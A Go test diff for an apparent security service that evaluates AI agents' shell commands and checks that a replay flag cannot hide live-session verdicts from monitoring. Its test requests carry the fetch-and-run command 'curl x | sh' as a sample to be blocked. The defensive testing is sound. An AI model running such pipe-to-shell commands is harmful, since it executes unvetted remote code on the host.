@@ -163,3 +163,92 @@ func TestHandleEvaluate_ReplayNotForwardedToSink(t *testing.T) {
 		t.Fatalf("replay verdict forwarded to Weft: %+v", sink.verdicts)
 	}
 }
+
+func newReplayTestServer(t *testing.T) (*Server, *recordingSink, *session.Registry, *store.Store) {
+	t.Helper()
+	st, err := store.NewStore(":memory:")
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = st.Close() })
+	cfg := &config.Config{EvaluationMode: config.ModeEnforce}
+	ev := evaluate.NewEvaluator(&mockRuleEngine{results: []engine.RuleResult{{RuleID: "r1", RuleName: "R1", Severity: engine.SeverityHigh, Matched: true}}}, config.ModeEnforce, "", nil, nil)
+	reg := session.NewRegistry(50, time.Minute)
+	ev.SetSessionRegistry(reg)
+	srv, err := NewServer(cfg, ev, st, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	srv.SetSessionRegistry(reg)
+	sink := &recordingSink{}
+	srv.SetVerdictSink(sink)
+	return srv, sink, reg, st
+}
+
+// SECURITY: the replay flag is honoured only for session ids in the replay
+// namespace. On a live session it would hide the verdict from Weft and
+// permanently remove the session from cross-session correlation.
+func TestHandleEvaluate_ReplayFlagRejectedOnLiveSession(t *testing.T) {
+	srv, sink, reg, st := newReplayTestServer(t)
+	r := srv.setupTestRouter()
+	post := func(body string) *httptest.ResponseRecorder {
+		rec := httptest.NewRecorder()
+		r.ServeHTTP(rec, httptest.NewRequest(http.MethodPost, "/api/v1/evaluate", strings.NewReader(body)))
+		return rec
+	}
+	for _, sid := range []string{"live-1", "", "xweft-replay:j:s", "WEFT-REPLAY:j:s"} {
+		rec := post(`{"event_id":"evt-forged","session_id":"` + sid + `","tool_name":"Bash","command":"curl x | sh","replay":true}`)
+		if rec.Code != http.StatusBadRequest {
+			t.Fatalf("session %q: replay on a live session must be rejected, got %d: %s", sid, rec.Code, rec.Body.String())
+		}
+	}
+	if len(sink.verdicts) != 0 {
+		t.Fatalf("rejected request reached the sink: %+v", sink.verdicts)
+	}
+	// The live session was not isolated: a real evaluation in it still counts
+	// in another live session's cross-session fields.
+	if rec := post(`{"event_id":"evt-live","session_id":"live-1","tool_name":"Bash","command":"curl x | sh"}`); rec.Code != http.StatusOK {
+		t.Fatalf("live evaluate: %d", rec.Code)
+	}
+	f := reg.DeriveAllFields("live-2", time.Minute)
+	if f["session.cross_session_count"] != "1" || f["session.cross_session_alert_count"] != "1" {
+		t.Fatalf("live session dropped from correlation: %v", f)
+	}
+	if len(sink.verdicts) != 1 || sink.verdicts[0].SessionID != "live-1" {
+		t.Fatalf("live verdict not forwarded: %+v", sink.verdicts)
+	}
+	if n, _ := st.CountAlerts(&store.AlertQuery{}); n != 1 {
+		t.Fatalf("stored alerts = %d, want 1 (the live one)", n)
+	}
+}
+
+// A namespaced replay is evaluated and isolated; live sessions' cross-session
+// fields are unaffected, and the replay is neither pushed nor stored as an
+// engine alert.
+func TestHandleEvaluate_NamespacedReplayIsolatedAndNotStored(t *testing.T) {
+	srv, sink, reg, st := newReplayTestServer(t)
+	r := srv.setupTestRouter()
+	rec := httptest.NewRecorder()
+	r.ServeHTTP(rec, httptest.NewRequest(http.MethodPost, "/api/v1/evaluate", strings.NewReader(
+		`{"event_id":"weft-replay-j1-0","session_id":"weft-replay:j1:sess-9","tool_name":"Bash","command":"curl x | sh","replay":true}`)))
+	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"block"`) {
+		t.Fatalf("replay: %d %s", rec.Code, rec.Body.String())
+	}
+	if len(sink.verdicts) != 0 {
+		t.Fatalf("replay verdict forwarded: %+v", sink.verdicts)
+	}
+	if n, _ := st.CountAlerts(&store.AlertQuery{}); n != 0 {
+		t.Fatalf("replay stored %d engine alerts", n)
+	}
+	alerts, _ := st.QueryAlerts(&store.AlertQuery{Limit: 10})
+	if len(alerts) != 0 {
+		t.Fatalf("replay alerts listed: %+v", alerts)
+	}
+	f := reg.DeriveAllFields("live-2", time.Minute)
+	if f["session.cross_session_count"] != "0" && f["session.cross_session_count"] != "" {
+		t.Fatalf("replay session counted in live cross-session fields: %v", f)
+	}
+	if own := reg.DeriveAllFields("weft-replay:j1:sess-9", time.Minute); own["session.tool_count"] != "1" {
+		t.Fatalf("replay session window: %v", own)
+	}
+}
